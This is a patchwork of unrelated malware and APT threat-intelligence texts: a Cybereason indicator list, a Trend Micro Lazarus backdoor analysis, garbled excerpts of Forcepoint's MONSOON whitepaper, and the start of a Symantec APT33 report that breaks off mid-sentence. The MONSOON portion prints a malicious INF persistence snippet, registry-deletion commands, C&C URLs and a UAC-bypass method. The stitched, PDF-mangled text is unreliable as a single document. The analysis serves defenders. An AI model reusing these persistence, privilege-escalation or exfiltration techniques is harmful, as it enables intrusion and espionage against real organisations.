CompromisE\\nSHA1\\n01782747C12Bf06A52704A144DB59FEC41B3CB36\\nHash\\nNF-e513468.zip\\nSHA1\\n1F83403398964D4E8B6C70B171C51CD278909172\\nHash\\nScript.js\\nSHA1\\nCE8BDB56CCAC55C6881701EBD39DA316EE7ED18D\\nHash\\nlrdsnhrxxfery64.~\\nSHA1\\n926137A50f473BBD257CD19E207C1C9114F6B215\\nHash\\nlrdsnhrxxfery98.~\\nSHA1\\n5579E03EB1DA076EF939196CB14F8B769F30A302\\nHash\\nlrdsnhrxxferyb.jpg\\nSHA1\\nB2734835888756929EE3FF4DCDE85080CB299D2A\\nHash\\nlrdsnhrxxferyc.jpg\\nSHA1\\n206352E13D601239E2D043D971EA6657C091071A\\nHash\\nlrdsnhrxxferydwwn.gif\\nSHA1\\nEAE82A63A980998F8D388BCCE7D967F28309F593\\nHash\\nlrdsnhrxxferydwwn.gif\\nSHA1\\n9CD5A399C9320CBFB87C9D1CAD3BC366FB12E54F\\nHash\\nlrdsnhrxxferydx.gif\\nSHA1\\n206352E13D601239E2D043D971EA6657C091071A\\nHash\\nlrdsnhrxxferye.jpg\\nSHA1\\n4CDE9A53A9A49D606BC89E74D47398A69E767056\\nHash\\nlrdsnhrxxferyg.gif\\nSHA1\\nF99319B1B321AE9F2D1F0361BC756A43D25444CE\\nHash\\nlrdsnhrxxferygx.gif\\nSHA1\\nB85C106B68ED410107f97A2CC38b7EC05353F1FA\\nHash\\nlrdsnhrxxferyxa.~\\nSHA1\\n77809236FDF621ABE37B32BF073B0B893E9CE67A\\nHash\\nlrdsnhrxxferyxb.~\\nSHA1\\nB85C106B68ED410107f97A2CC38b7EC05353F1fA\\nHash\\nlrdsnhrxxferyxa.~\\nSHA1\\nC2F3350AC58DE900768032554C009C4A78C47CCC\\nHash\\nr1.log\\n104.129.204.41\\nIP\\nC2\\n63.251.126.7\\nIP\\nC2\\n195.157.15.100\\nIP\\nC2\\n173.231.184.59\\nIP\\nC2\\n64.95.103.181\\nIP\\nC2\\n19analiticsx00220a.com\\nDomain\\nC2\\nqnccmvbrh.wilstonbrwsaq.pw\\nDomain\\nC2\\nShare\\nContinue Exploring_\\nThe Hole in the Bucket: Attackers Abuse Bitbucket to Deliver an Arsenal of Malware\\nRead More\\nHow to Prevent the Next Big POS Breach\\nRead More\\nDropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\\nRead More\\nThe Hole in the Bucket: Attackers Abuse Bitbucket to Deliver an Arsenal of Malware\\nRead More\\nHow to Prevent the Next Big POS Breach\\nRead More\\nDropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\\nRead More\\nThe Hole in the Bucket: Attackers Abuse Bitbucket to Deliver an Arsenal of Malware\\nRead More\\nHow to Prevent the Next Big POS Breach\\nRead More\\nDropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\\nRead More\\nReturn to Blog\\nAbout\\nWho We Are\\nCareers\\nManagement\\nContact\\nPlatform\\nOverview\\nNext Generation Antivirus\\nEndpoint Detection & Response\\nManaged Detection & Response\\nResources\\nBlog\\nCase Studies\\nWebinars\\nWhite Papers\\n©2019 Cybereason.

There seems to be a resurgence of activity from the group, and recent events show how their tools and techniques have evolved. Just last week they were found stealing millions from ATMs across Asia and Africa. We also recently discovered that they successfully planted their backdoor (detected by Trend Micro as BKDR_BINLODR.ZNFJ-A) into several machines of financial institutions across Latin America.\\nWe determined that these backdoors were installed on the targets’ machines on September 19 2018, based mainly on the service creation time of the loader component. We also saw that the attack technique bears some resemblance to a previous 2017 Lazarus attack, analyzed by BAE Systems, against targets in Asia. The use of FileTokenBroker.dll was a key part of the group’s attack in 2017, and they seem to have used the same modularized backdoor in the recent incident as well.\\nOur analysis of the backdoors used in the September 2018 attacks show that AuditCred.dll/ROptimizer.dll was similarly used:\\nFileTokenBroker.dll\\xa0 (2017 attack)\\nAuditCred.dll/Roptimizer.dll\\xa0 (2018 attack)\\nLaunch Method\\nService\\nService\\nFunction\\nLoader Component\\nLoader Component\\nWorking directory\\n%Windows%\\\\System32\\n%Windows%\\\\System32\\nLoaded Component Path\\n%Windows%\\\\System32\\\\en-US\\n%Program Files%\\\\Common Files\\\\System\\\\ado\\nLoaded Component Blending\\nBlends with .mui files\\nBlend with ActiveX data Object dll files\\nTable1: Similarities of the Loader components in both incidents\\nAnalysis of backdoors used in 2018\\nThe Lazarus group used a series of backdoors in their 2018 attacks, employing a complicated technique that involves three major components:\\nAuditCred.dll/ROptimizer.dll (detected by Trend Micro as BKDR_BINLODR.ZNFJ-A) – loader DLL that is launched as a service\\nMsadoz<n>.dll (detected by Trend Micro as BKDR64_BINLODR.ZNFJ-A) – encrypted backdoor\\nn = number of characters in the loader dll’s filename\\nAuditcred.dll.mui/rOptimizer.dll.mui (detected by Trend Micro as TROJ_BINLODRCONF.ZNFJ-A) – encrypted configuration file\\nFigure 1: Loading sequence of the modularized backdoor\\nThe loader DLL is installed as a service and uses different names (AuditCred and ROptimizer) on different machines. However, they still have the same capabilities and are essentially the same file. Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory.\\nFigure 2: AuditCred/ROptimizer Service\\nIf successfully installed, this particular backdoor poses quite a threat to its target. It is capable of the following functions:\\nCollect file/folder/drive information\\nDownload files and additional malware\\nLaunch/terminate/enumerate process\\nUpdate configuration data\\nDelete files\\nInject code from files to other running process\\nUtilize proxy\\nOpen reverse shell\\nRun in passive mode — instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it\\nOnce the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it. The connection is necessary for conducting activities; and based on the backdoor’s functions, these actions could be quite damaging to targets.\\nFigure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte\\nFigure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key\\nFigure 5: Encrypted (Top) and decrypted (bottom) configuration file\\nIt is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\\\\system32), the encrypted backdoor is located in a different directory (%Program Files%\\\\Common Files\\\\System\\\\ado). This complex setup makes it harder to detect and remove all the backdoors, and is more effective at hiding any activities.\\nThe complexity and the capabilities of these backdoors present a tough problem for the targeted organizations. It is a sophisticated attack that needs equally sophisticated security solutions.\\nTrend Micro Solutions\\nThe Lazarus group is an experienced organization, methodically evolving their tools and experimenting with strategies to get past an organization’s defenses. The backdoors they are deploying are difficult to detect and a significant threat to the privacy and security of enterprises, allowing attackers to steal information, delete files, install malware, and more.\\nThese and other tools used by the Lazarus group can be mitigated by routinely scanning the network for any malicious activity to help prevent the malware from entering and spreading through an organization. In addition, educating employees and other key people in an organization on social engineering techniques can allow them to identify what to look out for when it comes to malicious attacks.\\nOther mitigation strategies include a multilayered approach to securing the organization’s perimeter, which includes hardening the endpoints and employing application control to help prevent malicious applications and processes from being executed.\\nTrend Micro endpoint solutions such as Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security can protect users and businesses from these threats by detecting malicious files and spammed messages as well as blocking all related malicious URLs. Trend Micro Deep Discovery™ has an email inspection layer that can protect enterprises by detecting malicious attachments and URLs that could lead to malicious downloads.\\nTrend Micro XGen™ security provides a cross-generational blend of threat defense techniques to protect systems from all types of threats.

Revision: 1 .0 7 | TLP - WHITE | 4 / 57 EXECUTIVE SUMMARY MONSOON is the name given to the Forcepoint Security investigation into an ongoing espionag e campaign that the Special Investigations team have been tracking and analysing since May 2016. The overarching campaign appears to target both Chinese nationals within different industries and government agencies in Southern Asia. It appears to have sta rted in December 2015 and is still ongoing as of July 2016. Amongst the e vidence gathered during th e MONSOON investigation were a number of indicators which make it highly probable 1 that this adversar y and the OPERATION HANGOVER 1 , 2 adve rsary are one and the same. These indicator include t he use of the same i nfrastructure for the attacks , similar Tactics, Techniques and Procedures (TTPs), the targeting of demographically similar victims and operati ng geographically within the Indian S ubcontinent . The malware components used in MONSOON are typically distributed through weaponised documents sent through e - mail to specifically chosen targets. Themes of these documents are usually political in nature an d taken from recent publications on topical current affairs. Several malware components have been used in this operation including Unknown Logger Public , TINYTYPHON , BADNEWS , and an AutoIt 3 backdoor. BADNEWS is particular ly interesting, containing resilient command - and - control (C&C) capability using RSS feeds, Github, forums, blogs and Dynamic DNS hosts . This whitepaper provides an in - depth understanding and insight into the actors and their campaign. It includes detail ed analysis and findings , previously undocumented malware components, victims, and infrastructure involved. ACKNOWLEDGEMENTS We would like to acknowledge both Kaspersky and Cymmetria 4 who have published their own research on the groups referred to as \"PATCH WORK\" and \"DROPPER ELEPHANT\". We also recognise the analysis by Blue Coat in tracking OPERATION HANGOVER in the past 1 . We would like to thank the wider Forcepoint Security Labs team for their help with our investigation. We would also like to give special thanks to Ran Mosessco for assisting with specific analysis. 1 - 32 h ttps://www.gov.uk/government/uploads/system/uploads/attachment_data/file/311572/20110830_jdp2_00_ed3_with_change1.pdf mation is always better than less.

Virus Total 2 (VT) Intelligence queries are often constructed in order to hunt for new, unusual and interesting malware as part of the routine work p erformed by the Special Investigations team. The initial discovery of MONSOON stemmed from one of these queries. During such activities, an RTF document was identified that warranted further investigation. Cyber Crime Bill. A specific document was si ngled - out for analysis via VT for number of reasons . These included: a l ow detection rate , a l ow number of submissions , an interesting set of default languages including US English, Saudi Arabic and PRC Chinese, that it e xploited a known vulnerability ( CV E - 2015 - 1641 5 ) and that it had filename s with p olitical themes including Word - Telecommunications Policy - and \"Cyber_Crime_bill.doc\" 3 : This document was opened in a virtualised lab environment and was seen to drop malware. By analysing this malware is was possible to determine that it was not of a known or documented ma lware family. It contained interesting functionality that warranted further investigation ( see below) . T his malware was named b y Special Investigations as BADNEWS after its ability to use news sites and blogs to obtain its C&C address. Pivoting by Author. By exploiting the document information found in the original malicious RTF , the name of the user who last modified the docume nt was identified: 2 https://www.virustotal.com / 3 https://www.virustotal.com/en/file/34cdfc67942060ba30c1b9ac1db9bd042f0f8e487b805b8a3e1935b4d2508db6/analy s is/ PRELIM INARY (1) This Act may be called the Prevention of Electronic Crimes Act, 2015.

O ne of the samples used genuine content from the Na tional Institute for Defence Studies Japan document NIDS Ch ina Security Report 2016 4 . The specific filename used for this sample was \"china_report_EN_web_2016_A01.doc\" . Using Google to search for this specific filename returned three hits. Two of the results were for VT and another for a report on URLQuery.net. One of the VT results showed that the file was provided from a web server located on a host on IP address 37.58.60.195 and that it had also provided a number of other, similar files 5 . The other VT results referred to the analysis of the malicious file 6 .

The final Google search result was a report generated by the URLQuery.net site: Figure 7 URLQuery.net The site t.ymlp50. com  is a legitimate web and e - mail marketing service . It is owned and operated by the Belgian company Your Mailing List Provider (YML P). Further Google search es of other document names revealed similar redirection chains using the same service. Consequently, it is reasonable to conclude that a number of weaponised documents were delivered using YMLP. Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 10 / 57 E - MAIL LURES & MALWARE DISTRIBU TION Email Lures . Using the information from the initial discoveries and correlating against the data collected by Triton® AP - Email it was possible to track down at least some of the targeted e - mail lures used by the HANGOVER grou p in the MONSOON campaign. The e - mail themes are typically current political events that may be of interest to the target recipient . It was possible to identify sever al Chinese politically themed e - mails l i nking to weaponised documents. A redacted example e - mail can be seen below.

Figure 13 Lure Twitter Screen Shot Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 16 / 57 WEAPONISED DOCUMEN TS Exploitation of Known Vulnerabilities . Several document types and document exploits have been used in the MONSOON campaign to deliver various malware components. It is reasonable to suggest that the actors are using a malicious document builder to qui ckly weaponise legitimate documents. T he following vulnerabilities have been identified within the attackers\\' documents: Vulnerability Description CVE - 2012 - 0158 Microsoft BizTalk Server Windows Common Controls (MSCOMCTL.OCX) Bug Lets Remote Users Execute Arbitrary Code CVE - 2014 - 6352 Microsoft Windows CVE - 2014 - 6352 OLE Package Manager Remote Code Execution Vulnerability CVE - 2015 - 1641 Microsoft Office Memory Errors Let Remote Users Execute Arbitrary Code and Input Validation Flaw Permits Cross - Site Script ing Attacks Figure 14 Exploited CVEs Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 17 / 57 BADNEWS Weaponised Documents . The BADNEWS malware is typically packaged into a malicious document via an encrypted binary blob within th at document. This binary blob often contains a legit imate decoy doc ument that is shown to the user. On other occasions the decoy document is downloaded directly . CVE - 2015 - 1641 has been observed as being exploited to drop BADNEWS. When the document exploit is triggered, the shellcode will drop the binary bl ob into the user\\'s %temp% folder along with an encoded VBScript: Figure 15 Binary Blob Dropped to %temp% The encoded VBScript uses a file extension which is not associated, by default, as being a VBScript file. The extensions . domx and . lgx have been observed . The shellcode is responsible for adding a new file association for the file extension which specifies that they should be interpreted as an encoded VBScript. Finally, the shellcode executes the encoded VBScript file which will extract the encrypted files from the binary blob, show the decoy document (if there is one), and execute the malware. The VBScript hard - coded sizes of the files to extract from the binary blob: Figure 16 VB Extract of Blob Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 18 / 57 The decryption routine uses the encryption key \"ludos 7 to decrypt 32 - byte chunks of the embedded files: Figure 17 VB Decryption of Embedded Files Our analysis of BADNEWS can be found later in this document Page: 22  7 http://starw ars.wikia.com/wiki/Ludos Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 19 / 57 AutoIt Backdoor & Unknown Logger Weaponised Documents . The majority of weaponised documents drop an AutoIt backdoor . D ocument s exploiting CVE - 2014 - 6352 have been observed installing the malware via the following INF: Version Sig nature = \"$CHICAGO$\" class=61883 ClasGuid={2E87RBCD - 7488 - 12T1 - QYXX - 74521ACV1AS4} DriverVer=0/21/2006,61.7600.16385 DestinationDirs DefaultDestDir = 1 DefaultInstall AddReg = RxStart RxStart HKLM,Software \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ RunOnce,Inst all,,%1% \\\\ sysvolinfo.exe The malware executable name varies. The following are some of the names we have observed : sysvolinfo.exe svchost.exe rar.exe 360configuration_patch_update_2016v4.exe The AutoIt script is always roughly the same, but some versions contain less functionality. A full analysis of the AutoIt backdoor can be found later in this document Page: 30  . M alware known as Unknown Logger has also been dropped by the same sort of weaponised document. A full analysis of Unknown Logger can also be found later in this document Page: 37  . TINYTYPHON Weaponised Documents . A third malware used in MONSOON is a small backdoor based on publicly available code from the MyDoom 6 worm. This malware will crawl mapped drives for documents and upload them to its C&C. We have seen this dropped by an RTF exploiting CVE - 2012 - 0158 under the name \"DPP_INDIA_2016.doc\" 8 . The document contains shellcode which drops a file under %t emp% \\\\ svchost.exe and then attempts to disable Word\\'s recovery features via the following commands: cmd.exe /c reg delete \"HKCU \\\\ Software \\\\ Microsoft \\\\ Office \\\\ 14.0 \\\\ Word \\\\ Resiliency\" /F cmd.exe /c reg delete \"HKCU \\\\ Software \\\\ Microsoft \\\\ Office \\\\ 12.0 \\\\ Word \\\\ Resiliency\" /F The svchost.exe 9 dropped by the document executes an embedded, base64 encoded malware component that we have named \" TINYTYPHON \".

It was therefore not possible to analyse the pages served. However, it was possible to browse to lite.php on newsnstat. com  . The content of this page always remained the same over the duration of the investigation. Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 21 / 57 Silverlight Profiling . Th e code profiles whether a system has Microsoft Silverlight installed. The site then requests lite.php?name= where the value of name is \\'true\\' or \\'false\\' depending on whether Silverlight is installed and accessible or not. No further content was served fro m lite.php during the investigation. A likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware in the case of a user who does not open or get successfully exploited by the weaponised document. This could have been intended as an exploitation of something like CVE - 2016 - 0034 which is known to have been adopted by exploit kits back in February 2016 and which pre - dates MONSOON.

The name was given due to its use o f RSS feeds, forums, blogs and D y na mic DNS providers for its C&C infrastructure. BADNEWS uses a DLL side - loading technique with a signed Java binary in order to evade security solutions. It is a first stage malware that is likely to receive second stage malware components if the target is of interest, although we did not observe this behaviour. DLL Side - Loading . The BADNEWS DLL is typicall y side - loaded into a legitimate signed Java executable. A specific weaponised document analysed 10 drops a binary blob and an encoded VBScript file which then extracts a decoy document along with the following 3 files: MicroScMgmt.exe msvcr71.dll jli.dll Mic roScMgmt.exe is a renamed version of the legitimate Java Runtime\\'s 6.0.390.4 binary named java - rmi.exe and is signed by Sun Microsystems. This application requires the legitimate msvcr71.dll and also requires a DLL named jli.dll . However, the jli.dll here contains the BADNEWS malware. When MicroScMgmt.exe is executed, it will load up the malicious jli.dll and ultimately call the JLI_WildcardExpandClasspath_0 export in the DLL. At this point the BADNEWS code will take over and begin performing its malicious routines. This technique is a stealth tactic to evade anti - malware solutions which are notoriously weak at detecting side - loaded malware. The malware will spawn 2 threads, one to perform key - logging and one to crawl the local hard - drives for document fil es. Persistence . BADNEWS installs a registry key under HKEY_CURRENT_USER \\\\ SOFTWARE \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run in order to remain persistent on the system. Figure 20 Windows Registry Keys 10 SHA1: 11064dcef 86ac1d94c170b24215854efb8aad542 Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 23 / 57 C&C Channels . BADNEWS is ty pically built with several hard - coded channels which it can use to obtain commands or change its C&C. These C&C channels include RSS feeds, Github, forums, blogs and Dynamic DNS hosts. In the sample analysed, the malware had several hard - coded C&C channels although some were corrupted and did not work correctly: hxxp://feeds.rapidfeeds.com/81913/ hxxps://raw.githubusercontent.com/azeemkhan89/cartoon/master/cart.xml hxxp://www.webrss.com/createfeed.phpfeedid=47448 hxxp://www.webrss.com/createfeed.phpfeedid=4 7449 hxxp://www.chinasmack.com/2016/digest/chinese - tourist - bit - by - snake - in - thailand.html hxxp://www.travelhoneymoon.wordpress.com/2016/03/30/tips - to - how - to - feel - happy hxxp://overthemontains.weebly.com/trekking - lovers hxxp://tariqj.crabdance.com/tesla/ghsnl s.php hxxp://javedtar.chickenkiller.com/tesla/ghsnls.php hxxp://asatar.ignorelist.com/tesla/ghsnls.php The first 7 C&Cs are referred to by the malware as either a \"blog\" or a \"feed\". These channels are only used to tell the malware where its real C&C is. T he last 3 Dynamic DNS channels are back - up C&Cs in case it is not able to obtain a C&C address from one of the blogs or feeds. The Dynamic DNS back - up C&Cs typically use the same filename but the directory name changes for different builds of the malware. The directory may indicate a campaign identifier or a code - word for the target victim of the malware. We have seen the following directories used: tesla Tussmal Mussmal quantum yumhong Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 24 / 57 When a C&C is obtained from a blog or feed, it is extra cted from the page by searching for \"{{\" in the content.

When BADNEWS first starts it will spawn a new thread to log keystrokes to a file. T he header of the file contains the marker \" KLTNM: \" and the system language. The rest of the file contains information about the active window and the keys pressed: KLTNM: 2016/06/01 09:42:18 - { Window Name } SHIFTcSHIFT; The malware will only send the keylog file to the C&C when instructed to by the \" kl \" command. Document Crawler . When BADNEWS first starts it will spawn a new thread to check all local & mapped drives for document files with the following extensions: doc docx pdf ppt pptx txt Any documents under 15MB will be copied to the user\\'s %temp% \\\\ SMB \\\\ folder. The malware will only send these documents to the C&C when instructed to by the \" ustr \" command. Window Message Processor . BADNEWS will also check for any new hard - drives that are added to the machine such as USB devices. It does this in an interesting way by creating a window and listening for the WM_DEVICECHANGE window message: LRESULT CALLBACK WndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) { // Window message 23 is defined by the malware as a code to disable the document crawler if ( Msg > WM_QUERYENDSESSION ) { if ( Msg == WM_ENDSESSION ) return 23; // Has a new device been added to the machine?

A fully decompiled version of this AutoIt backdoor was generated by the Special Investi Document Exfiltration . T he AutoIt backdoor is capable of finding and uploading documents with the following extensions: *.doc;*.pdf;*.csv;*.ppt;*.docx;*.pst;*.xls;*.xlsx;*.pptx;*.jpeg These will then be uploaded to / update - request.php on the C&C. Figure 27 Upload via PHP Script Privilege Escalation . The backdoor will attempt to escalate privileges by bypassing Windows User Account Control (UAC) using one of two well - known techniques 13 : If the user\\'s operating system is 64 - bit then the malware will use the Windows Update Standalone Installer (WUSA) to copy its DLL into a protected folder ( C: \\\\ Windows \\\\ System32 \\\\ oobe ) with the name wdscore.dll . It will then execute oobe.exe which will side - load the malicious wdscore.dll instead of the one from the system directory. If the user is on a 32 - bit system then the malware will use the CallWindowProcW API to jump into some shellcode that will inject the UAC bypass executable into Svchost.exe . Firs tly, the legitimate Windows \" Computer Management.lnk \" file is overwritten with a new version using Leo Davidson\\'s IFi leOperation 14 code. This links to the original malware executable. Secondly, the malware will execute CompMgmtLauncher.exe which in turn wil l execute the copied shortcut as an elevated process. 13 https://www.pretent iousname.com/misc/win7_uac_whitelist2.html 14 https://msdn.microsoft.com/en - us/library/bb775771(VS.85).aspx Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 32 / 57 PowerShell Second Stage & Metasploit Meterpreter . The AutoIt backdoor will send heartbeats to its C&C at / dropper.php and receive back commands. During our analysis, we saw that the C&C 212.129.1 3.110 was serving a base64 encoded resp onse to the heartbeat requests: Figure 28 Base64 Response This response contains the command ID and the parameter. In this case the command ID is 2 which tells the AutoIt backdoor to exe cute the base64 encoded blob under PowerShell.

UNKNOWN LOGGER PUBLIC V 1.5 Unknown Logger is another malware component used in MONSOON. It is a publicly released, free backdoor . It is capable of credential theft from browsers, keylogging, taking screenshots, spreading itself laterally, and downloading second stage malware. In 2012, a user named \"The Unknown\" publicly released a free version of a credential stealing worm on hackforums. net  called \"Unknown Logger Public\" . The actors have been using version 1.5 of this malware in some of their weaponised documents. It is likely that they simply downloaded and built their own version from the publicly available version 1.5 on Hackforums. Unkn own Logger is dropped by at least two 15 of the weaponised documents analysed. Both of these documents exploit CVE - 2014 - 6352 . 15 SHA1: 824013c9d8b2aab1396c4a50579f8bd4bf80abdb SHA1: e27d3cfc9141f618c5a8c075e7d18af11a012710 Figure 33 Unknown Logger Server Configuration Panel Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 38 / 57 Figure 34 Unknown Logger Settings Panel Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 39 / 57 Unknown Logger\\'s main purpose is to record keystrokes and s teal usernames and passwords saved by browsers on the local machine. This information is then sent to a pre - defined FTP or SMTP server with a username and password specified by the actor when building the malware. It can also spread itself into RAR files, USB devices and network shares. Interestingly it does not have the ability for C&C communication. It cannot execute arbitrary commands or receive a command in dicating what it should do next.

The \" DownloadExecFileURL \" specifies a URL to grab an additional file from and execute it at runtime. A nalysis found that nregsrv2 . exe is the same AutoIt trojan dropped by many of the other weaponised documents used in this campaign. TINYTYPHON The TINYTYPHON malware is a small backdoor capable of finding and uploading documents on locally mapped drives and receiving secondary malware . It is dropped by at least one of the weaponised documents 17 used in the MONSOON campaign where it is embedded inside another executable. The majority of the code for TINYTYPHON is taken from the MyDoom worm and has been repurposed to find and exfiltrate documents. Configuration & Persistence . TINYTYPHON contains a small configuration appended to the end of the executable. In the sample analysed 18 this configuration was XORed with the hexadecimal value 0x90. 17 SHA1 : 9cdbb41f8 3854ea4827c83ad9809ed0210566fbc 18 SHA1: fcf8e5cf1 207fdfab9bcb0a4dc45ad188089655a Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 42 / 57 Fi gure 36 XOR 0x90 Data The configuration contains the C&C address and paths to use as well as a list of document extensions to check when crawling local drives. It also contains the filename to copy itself to in the local system32 directory, and the name of the persistence registry key to install itself under HKEY_LOCAL_MACHINE \\\\ Software \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run . Document Crawler . TINYTYPHON constantly searches for and uploads documents on the local machine.

Figure 41 C &C Web Server /http/upload/<victim> listing The filenames begin with the MD5 hash of the file, then a dash, and then the original filename. There were thous ands of documents which had been exfiltrated to this C&C. After reviewing the filenames of documents from several of the victims, it appears as though most of the victims are involved with government agencies . Some of these documents contain highly sensiti ve information such as clearance documents, financial information, and technical specifications. During the investigation, the server stopped responding on June 8, 2016 and then came back online on July 5, 2016. It is unknown why this month long outage occ urred, although it could have been because the group knew that people were accessing the open directories and wanted to remain undetected . Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 47 / 57 ATTRIBUTION With respect to attribution, Forcepoint Security Labs focus on enabling the awareness and understanding o f intent. This is useful in order to identify likely future behaviour. Reports from Special Investigations do not focus on specific attribution. VICTIMS The MONSOON victims fit with a group who have military and political interests in the Indian Subcont inent . Many of the victims are located in surrounding countries including Bangladesh, Sri Lanka and Pakistan. But victims also originate from further afield, including Africa and the Far East. The targeting of Chinese nationals may also be related to this campaign , but equally may be part of a separate campaign by the adversary or even as part of them selling Surveillance - As - A - S ervice in a similar manner previously seen with the HANGOVER group 2 . A DVERSARIES It was possible to i dentify an individual from a domain registration record who is believed to be associated with MONSOON. There is a highly probable level of confidence in this association due to the following reasons: The domain name registered is a variant of one of the mo st popular domains used in MONSOON The person who registered the domain lives or has lived and works in India The person who registered the domain has profiles on coding challenge and freelance coder websites. The HANGOVER group are thought to use freelanc e coders. accounts. However, it is not deemed in the public interest to publish specific details on this individual. Relevant authorities are informed as an d when appropriate. Cui Bono? A useful analysis viewpoint is to ask the legal question: Cui Bono ? Or: w ho profits? Even though this report does not attempt to focus on specific attribution, asking hat is to be gained from these actions or what needs a may offers some insight. Any further analysis is left as an exercise to for reader. From the documents known to have been exfiltrated , a number of recurring themes occur : Army training, personnel and payroll records Defence attaches and co nsulates Defence research Foreign high commissions Military exercises Military air platforms Military naval platforms Military logistic records Naval coastal protection Anti - torpedo and naval electronic countermeasure (ECM) systems. Submarine communication systems Nuclear security and counter proliferation United Nations Personal details including medical records, d riving license, p assport and visas Accounting records Travel and itinerary details Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 48 / 57 INFRASTRUCTURE By integrating the findings with prior resear ch 1 8 , i t was possible to connect MONSOON directly with infrastructure used by the HANGOVER group via a series of strong connections. The original HANGOVER infrastructure overlaps with unique pa ssive DNS records and is further linked by the use of a specific SOA RNAME record. An example of this connection is illustrated below. Figure 42 Connection Topology Both of the IPs that link this infrastructure appear to be un ique to the Hangover group. The newsnstat. com  domain was used earlier in 2015 for previous HANGOVER campaigns, and was then repurposed in December 2015 for the MONSOON campaign.

Click for details.Critical Attack Discovery and Intelligence TeamSymantecPosted: 27 Mar, 20198 Min ReadThreat Intelligence SubscribeElfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.Although heavily focused on the Middle East, Elfin (aka APT33) has also targeted a range of organizations in the U.S. including a number of major corporations.The Elfin espionage group (aka APT33) has remained highly active over the past three years, attacking at least 50 organizations in Saudi Arabia, the United States, and a range of other countries.\\nThe group, which first became active in late 2015 or early 2016, specializes in scanning for vulnerable websites and using this to identify potential targets, either for attacks or creation of command and control (C&C) infrastructure. It has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors.\\nFigure 1. Elfin attacks by country, 2016 -2019Many U.S. targets\\nElfin continues to be focused heavily on Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec since the beginning of 2016. However, the U.S. has also been a country of significant interest to the group, with 18 organizations attacked over the past three years, including a number of Fortune 500 companies.\\nElfin targets in the U.S. have included organizations in the engineering, chemical, research, energy consultancy, finance, IT, and healthcare sectors.\\nFigure 2. Elfin attacks by sector, 2016-2019Some of these U.S. organizations may have been targeted by Elfin for the purpose of mounting supply chain attacks. In one instance, a large U.S. company was attacked in the same month a Middle Eastern company it co-owns was also compromised.\\nFigure 3. Elfin attacks by month, 2016-2019 Vulnerability exploitation\\nIn a recent wave of attacks during February 2019, Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR, the widely used file archiving and compression utility capable of creating self-extracting archive files. The exploit was used against one target in the chemical sector in Saudi Arabia. If successfully exploited on an unpatched computer, the vulnerability could permit an attacker to install any file on the computer, which effectively permits code execution on the targeted computer.\\nTwo users in the targeted organization received a file called \"JobDetails.rar\", which attempted to exploit the WinRAR vulnerability. This file was likely delivered via a spear-phishing email.\\xa0However, prior to this attempted attack, Symantec had rolled out proactive protection against any attempt to exploit this vulnerability (Exp.CVE-2018-20250). This protection successfully protected the targeted organization from being compromised.\\nThe Shamoon connection\\nElfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon victim in Saudi Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware (Trojan.Stonedrill) used by Elfin. Because the Elfin and the Shamoon attacks against this organization occurred so close together, there has been speculation that the two groups may be linked. However, Symantec has found no further evidence to suggest Elfin was responsible for these Shamoon attacks to date.\\xa0 We continue to monitor the activities of both groups closely.\\nElfin’s toolset\\nElfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source hacking tools.\\nCustom malware used by the group include:\\nNotestuk (Backdoor.Notestuk) (aka TURNEDUP): Malware that can be used to open a backdoor and gather information from a compromised computer.\\nStonedrill (Trojan.Stonedrill): Custom malware capable of opening a backdoor on an infected computer and downloading additional files. The malware also features a destructive component, which can wipe the master boot record of an infected computer.\\nAutoIt backdoor: A custom built 